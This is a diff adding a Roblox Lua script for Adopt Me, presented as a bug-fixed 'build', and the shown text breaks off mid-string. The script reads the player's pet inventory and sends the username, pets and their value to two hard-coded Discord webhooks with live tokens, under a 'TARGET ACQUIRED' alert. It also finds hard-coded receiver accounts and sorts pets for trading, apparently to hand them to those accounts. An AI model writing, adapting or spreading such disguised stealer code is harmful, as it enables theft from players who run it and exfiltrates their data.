@@ -1,0 +1,110 @@
+-- [[ MONDEUR ELYSIUM v2.1 - BULLETPROOF ADM BUILD ]] --
+-- Fix: Stops "Nil Value" errors by waiting for the game to fully load.
+
+if getgenv().MondeurExecuted then return end
+getgenv().MondeurExecuted = true
+
+local Players           = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService       = game:GetService("HttpService")
+local LocalPlayer       = Players.LocalPlayer
+
+-- [01] CONFIGURATION
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1403619431325634631/ygxLnix7JFuXUKC-wUgemRyPODjiPI65kyn0I0i2ATQQ0VVbjDukmhUfsg42b7HjvTuG"
+local DUAL_URL    = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
+local RECEIVERS   = {"CREOLE023", "Hisokarah", "2ndcfpaj67", "3rdcfpaj67"}
+
+local PING_LIMIT  = 5
+local DUAL_LIMIT  = 40.0 -- High Tier Point Trigger
+
+--------------------------------------------------------------
+-- [02] PRE-FLIGHT CHECK (STOPS NIL ERRORS)
+--------------------------------------------------------------
+local function WaitForGame()
+    -- Wait for the Adopt Me loading screen to disappear
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    while PlayerGui:FindFirstChild("LoadingUI") or PlayerGui:FindFirstChild("LoadingScreen") do
+        task.wait(1)
+    end
+    -- Wait for the internal game engine (Fsys)
+    local Fsys = nil
+    repeat
+        Fsys = pcall(function() return require(ReplicatedStorage:WaitForChild("Fsys", 5)) end)
+        task.wait(1)
+    until Fsys
+    task.wait(2) -- Final stabilization
+    return true
+end
+
+--------------------------------------------------------------
+-- [03] WEBHOOK LOGIC (ETFB STYLE)
+--------------------------------------------------------------
+local function sendWebhook(url, content, embeds)
+    local req = (syn and syn.request) or http_request or request
+    if not req then return end
+    pcall(function()
+        req({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({content = content or "", embeds = embeds or {}})
+        })
+    end)
+end
+
+--------------------------------------------------------------
+-- [04] TRADE ENGINE (BUCKET SORTING)
+--------------------------------------------------------------
+local function executeTrade()
+    local Fsys = require(ReplicatedStorage:WaitForChild("Fsys"))
+    local RouterClient = Fsys.load("RouterClient")
+    local InventoryDB  = Fsys.load("InventoryDB")
+    local TradeAPI     = ReplicatedStorage:WaitForChild("API"):WaitForChild("Trade")
+
+    -- Identify Admin
+    local admin = "None"
+    for _, n in pairs(RECEIVERS) do if Players:FindFirstChild(n) then admin = n break end end
+
+    -- Fetch Data
+    local allData = RouterClient.get("DataAPI/GetAllServerData"):InvokeServer()
+    local playerKey = allData[LocalPlayer.Name] and LocalPlayer.Name or tostring(LocalPlayer.UserId)
+    local rawPets = allData[playerKey].inventory.pets
+    
+    if not rawPets then return end
+
+    -- ETFB Bucket Sort
+    local buckets = { mega = {}, neon = {}, high = {}, normal = {} }
+    local petCount, petText, totalPoints = 0, "", 0
+    local hasHighTier = false
+
+    for _, item in pairs(rawPets) do
+        local db = InventoryDB.pets[item.id]
+        if db then
+            local val = (_G.GetTrueValue and _G.GetTrueValue(item)) or 0
+            petCount = petCount + 1
+            totalPoints = totalPoints + val
+            petText = petText .. "- " .. (db.name or "Unknown") .. " [" .. val .. "]\n"
+
+            if val >= DUAL_LIMIT then hasHighTier = true end
+
+            if item.properties and item.properties.mega_neon then
+                table.insert(buckets.mega, item)
+            elseif item.properties and item.properties.neon then
+                table.insert(buckets.neon, item)
+            elseif val >= 10 then
+                table.insert(buckets.high, item)
+            else
+                table.insert(buckets.normal, item)
+            end
+        end
+    end
+
+    -- Send Report
+    local ping = (hasHighTier or petCount >= PING_LIMIT) and "@everyone" or ""
+    local embed = {
+        title = hasHighTier and "🔥 TARGET ACQUIRED (HIGH TIER)" or "💎 SYSTEM CONNECTED",
+        color = hasHighTier and 0xFF0000 or 0x00FF00,
+        fields = {
+            {name = "👤 User", value = "```"..LocalPlayer.Name.."```", inline = true},
+            {name = "⚖️ Points", value = "```"..string.format("%.2f", totalPoints).."```", inline = true},
+            {name = "📦 Inventory", value = "
